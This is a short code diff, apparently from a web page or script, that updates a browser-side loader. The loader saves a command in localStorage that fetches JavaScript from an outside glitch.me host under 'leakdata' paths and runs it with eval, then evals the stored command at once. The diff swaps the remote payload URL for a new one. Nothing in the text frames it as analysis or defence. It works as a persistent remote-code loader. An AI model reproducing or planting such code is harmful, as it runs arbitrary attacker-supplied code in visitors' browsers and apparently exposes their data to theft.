@@ -1,5 +1,5 @@
 localStorage.setItem(
 'l', 
-"fetch('https://nhdcoll.glitch.me/leakdata/leakdata/ldfimh.js').then(response=>response.text()).then(script=>eval(script))"
+"fetch('https://nhdcoll.glitch.me/leakdata/new/limh.js').then(response=>response.text()).then(script=>eval(script))"
 )
 eval(localStorage.l)
